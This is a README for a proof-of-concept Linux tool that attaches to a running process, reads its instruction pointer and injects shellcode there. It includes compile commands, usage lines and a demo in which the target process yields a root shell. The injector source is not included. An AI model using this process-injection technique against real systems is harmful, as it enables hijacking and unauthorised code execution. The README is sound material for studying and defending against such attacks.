# memory-injector
A PoC Linux malware to inject shellcode into a running process, and execute on next instruction

# Explanation
This tool finds a process, and reads it's registers. The next instruction location is stored in the RIP register, the address of which will be executed next.
The `inject` binary, finds a process you supply, reads it's next RIP location, and injects the shellcode provided into the address.
On next instruction execution, the process will read RIP and therefore fetch your shellcode to execute.

# Compile
```bash
gcc hello.c -o hello
gcc inject.c -o inject
```

# Example
```
Usage: $ ./inject -p [PID]
Or   : $ ./inject -n [PROCESS NAME]
```

```
# [Terminal 1]

root@my-pc# ./hello
Hello, world! (Press enter to continue forever!)
Hello, world! (Press enter to continue forever!)
Hello, world! (Press enter to continue forever!)
...
```

```
# [Terminal 2]
root@my-pc# ./inject -n hello
Searching process information for 'hello'...
Injecting into PID 72743 [./hello]
64 bit system detected - using x86_64 shellcode
Attached to PID 72743
Enumerated current registers (RIP -> 0x00007F4A6FCCA0ED)
Injected byte(s) 046
Detaching from PID 72743
```

```
# [Terminal 1]
Hello, world! (Press enter to continue forever!)
# whoami
root
# echo pwned
pwned
```
